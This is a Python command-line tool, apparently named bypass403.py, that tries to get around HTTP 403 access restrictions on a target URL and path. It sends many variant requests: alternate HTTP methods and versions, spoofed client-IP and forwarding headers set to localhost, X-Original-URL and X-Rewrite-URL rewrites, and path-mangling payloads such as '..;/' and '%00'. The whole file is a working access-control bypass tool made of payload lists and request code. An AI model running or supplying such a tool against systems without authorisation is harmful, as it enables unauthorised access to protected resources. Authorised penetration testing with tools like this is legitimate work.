import requests
import getopt
import sys
import common

from urllib.parse import quote_plus
from http.client import HTTPConnection


def help():
    print("\t-u URL, --url=URL\tscan url")
    print("\t-p , --path      \tdir or file")
    print("\t-c, --cookie     \tset cookie separate [,]")
    print("\t-r, --redirect     \tfollow redirect")
    print("EXAMPLES: ")    
    print("\tbypass403.py -u http://example.com -p test")
    print("\tbypass403.py --url=http://example.com --path=test")
    print("\tbypass403.py --url=http://example.com --path=test --cookie session=test,path=/")

    
def version_fuzz(url, path, cookie=None, redirect=False):
    version_payloads = ["HTTP/0.9",
                        "HTTP/1.0",
                        "HTTP/1.1",
                        "HTTP/2.0"]
    for version in version_payloads:
        HTTPConnection._http_vsn_str = version
        resp = requests.get(f"{url}/{path}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)
        print(common.good_code(resp.status_code,f" {version} [code:{resp.status_code} size:{len(resp.content)}]"))
    HTTPConnection._http_vsn_str = "HTTP/1.1"

        
def methods_fuzz(url, path, cookie=None, redirect=False):
    method_payloads = ["GET",
                       "PUT",                       
                       "POST",
                       "HEAD",                       
                       "COPY",
                       "MOVE",
                       "LOCK",
                       "MKCOL",
                       "PATCH",
                       "TRACE",
                       "UNLOCK",
                       "DELETE",
                       "SEARCH",
                       "OPTIONS",
                       "CONNECT"]
    
    for method in method_payloads:
        resp = requests.request(method, f"{url}/{path}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)
        print(common.good_code(resp.status_code, f" {method} {url}/{path} [code:{resp.status_code} size:{len(resp.content)}]"))


    
def scheme_fuzz(url, path, cookie=None, redirect=False):
    protocol_payloads = ["X-Forwarded-Protocol",
                         "X-Forwarded-Proto",
                         "X-Url-Scheme",
                         "X-Forwarded-Scheme"]
    
    scheme_payloads = ["http",
                       "https"]
    
    for scheme in scheme_payloads:
        for proto in protocol_payloads:
            resp = requests.get(f"{url}/{path}", headers={proto : scheme, "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, cookies=cookie, allow_redirects=redirect)
            print(common.good_code(resp.status_code,f" {proto}: {scheme} [code:{resp.status_code} size:{len(resp.content)}]"))


def port_fuzz(url, path, cookie=None, redirect=False):
    ports_payloads = [80, 8080, 8000, 443, 4443]
    for port in ports_payloads:
        resp = requests.get(f"{url}/{path}", headers={"X-Forwarded-Port" : f"{port}", "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, cookies=cookie, allow_redirects=redirect)
        print(common.good_code(resp.status_code,f" X-Forwarded-Port: {port} [code:{resp.status_code} size:{len(resp.content)}]"))

    
def headers_fuzz(url, path, cookie=None, redirect=False):
    headers_payloads = ["Client-IP",
                        "True-Client-IP",
                        "Cluster-Client-IP",
                        "Forwarded-For",
                        "Source-IP",
                        "WL-Proxy-Client-IP",
                        "X-Custom-IP-Authorization",
                        "X-Forwarded-For",
                        "X-Forwarded",
                        "X-Forwared-Host",
                        "X-Forward-For",
                        "X-Forwarded-By",
                        "X-Forwarded-For-Original",
                        "X-Forwarded-Server",
                        "X-Remote-IP",
                        "X-Remote-Addr",
                        "X-Original-URL",
                        "X-Rewrite-URL",
                        "X-Originating-IP",
                        "X-Original-Host",
                        "X-Original-IP",
                        "X-Original-Remote-Addr",
                        "X-Originally-Forwarded-For",
                        "X-ProxyUser-Ip",
                        "X-Gateway-Host",
                        "X-Host",
                        "X-Ip",
                        "X-Backend-Host",
                        "X-ProxyMesh-IP",
                        "X-Real-IP",
                        "X-True-Client-IP",
                        "X-Wap-Profile"]  
    
    for header in headers_payloads:
        for addr in common.ADDR_LOCALHOST:
            resp = requests.get(f"{url}/{path}", headers={header : addr, "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, cookies=cookie, allow_redirects=redirect)
            print(common.good_code(resp.status_code,f" {header}: {addr} [code:{resp.status_code} size:{len(resp.content)}]"))
            
    resp = requests.get(f"{url}", headers={"X-Original-URL" : f"/{path}", "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, cookies=cookie, allow_redirects=redirect)
    print(common.good_code(resp.status_code,f" X-Original-URL: /{path} [code:{resp.status_code} size:{len(resp.content)}]"))
    
    resp = requests.get(f"{url}", headers={"X-Rewrite-URL" : f"/{path}", "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, cookies=cookie, allow_redirects=redirect)
    print(common.good_code(resp.status_code,f" X-Rewrite-URL: /{path} [code:{resp.status_code} size:{len(resp.content)}]"))

    resp = requests.get(f"{url}", headers={"Referer" : f"/{path}", "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, cookies=cookie, allow_redirects=redirect)
    print(common.good_code(resp.status_code,f" Referer: /{path} [code:{resp.status_code} size:{len(resp.content)}]"))

            
def paths_fuzz(url, path, cookie=None, redirect=False):  
    payloads = [ ".", "./", "../", ";/", ".;/", "..;/", "/;//", "*", "#", "?", "?id=1", "??", "??id=1", "???", "???id=1", ".json", ".", "%00", "%20", "%09"]
    
    resp = requests.get(f"{url}/{path}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)
    print(common.good_code(resp.status_code, f"{url}/{path} [code:{resp.status_code} size:{len(resp.content)}]"))
    resp = requests.get(f"{url}/{path.upper()}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)
    print(common.good_code(resp.status_code, f"{url}/{path.upper()} [code:{resp.status_code} size:{len(resp.content)}]"))
    for payload_one in payloads:
        resp = requests.get(f"{url}/{payload_one}{path}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)
        print(common.good_code(resp.status_code, f"{url}/{payload_one}{path} [code:{resp.status_code} size:{len(resp.content)}]"))
        resp = requests.get(f"{url}/{payload_one}{path.upper()}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)
        print(common.good_code(resp.status_code, f"{url}/{payload_one}{path.upper()} [code:{resp.status_code} size:{len(resp.content)}]"))
        resp = requests.get(f"{url}/{path}{payload_one}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)
        print(common.good_code(resp.status_code, f"{url}/{path}{payload_one} [code:{resp.status_code} size:{len(resp.content)}]"))
        resp = requests.get(f"{url}/{payload_one}{path.upper()}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)
        print(common.good_code(resp.status_code, f"{url}/{path.upper()}{payload_one} [code:{resp.status_code} size:{len(resp.content)}]"))
        for payload_two in payloads:           
            resp = requests.get(f"{url}/{payload_one}{path}{payload_two}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)
            print(common.good_code(resp.status_code, f"{url}/{payload_one}{path}{payload_two} [code:{resp.status_code} size:{len(resp.content)}]"))
            resp = requests.get(f"{url}/{payload_one}{path.upper()}{payload_two}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)
            print(common.good_code(resp.status_code, f"{url}/{payload_one}{path.upper()}{payload_two} [code:{resp.status_code} size:{len(resp.content)}]"))            
            resp = requests.get(f"{url}/{payload_one}{path}/{payload_two}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)
            print(common.good_code(resp.status_code, f"{url}/{payload_one}{path}/{payload_two} [code:{resp.status_code} size:{len(resp.content)}]"))
            resp = requests.get(f"{url}/{payload_one}{path.upper()}/{payload_two}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)
            print(common.good_code(resp.status_code, f"{url}/{payload_one}{path.upper()}/{payload_two} [code:{resp.status_code} size:{len(resp.content)}]"))



def parse_slash(url, path):
    if url[-1] == '/':
        url = url[:-1]
    if path != '/' and path[0] == '/':
        path = path[1:]
    if path != '/' and path[-1] == '/':
        path = path[:-1]
    if path == '/':
        path = ""
    return url, path


def main():       
    url = None
    path = None
    cookie = None
    redirect = False
    try:
        opts, args = getopt.getopt(sys.argv[1:], "u:p:c:r", ["url=", "path=", "cookie=", "redirect="])
        for opt, arg in opts:            
            if opt in ("-u", "--url"):                    
                url = arg
            elif opt in ("-p", "--path"):                    
                path = arg
            elif opt in ("-c", "--cookie"):                    
                cookie = common.parse_cookie(arg)
            elif opt in ("-r", "--redirect"):                    
                redirect = True
            else:
                help()
                sys.exit(0)
    except getopt.GetoptError as err:
        help()
        sys.exit(0)
    try:  
        if url is not None and path is not None:            
            print(f"\nURL: {url}\nPATH: {path}\n")            
            url, path = parse_slash(url, path)
            
            print("-------------------")
            print("[!] Methods fuzzing")
            print("-------------------\n")
            methods_fuzz(url, path, cookie=cookie, redirect=redirect)

            print("\n-------------------")
            print("[!] Scheme fuzzing")
            print("-------------------\n")
            scheme_fuzz(url, path, cookie=cookie, redirect=redirect)

            print("\n-------------------")
            print("[!] Port fuzzing")
            print("-------------------\n")
            port_fuzz(url, path, cookie=cookie, redirect=redirect)
            
            print("\n-------------------")
            print("[!] Version fuzzing")
            print("-------------------\n")
            version_fuzz(url, path, cookie=cookie, redirect=redirect)
            
            print("\n-----------------")
            print("[!] Paths fuzzing")
            print("-----------------\n")
            paths_fuzz(url, path, cookie=cookie, redirect=redirect)
            
            print("\n-------------------")
            print("[!] Headers fuzzing")
            print("-------------------\n")
            headers_fuzz(url, path, cookie=cookie, redirect=redirect)
        else:
            help()
    except KeyboardInterrupt:
        sys.exit(0)
    except requests.ConnectionError as e:
        print(e)
    except requests.Timeout as e:
        print(e)
    except requests.RequestException as e:
        print(e)

if __name__ == "__main__":
    main()
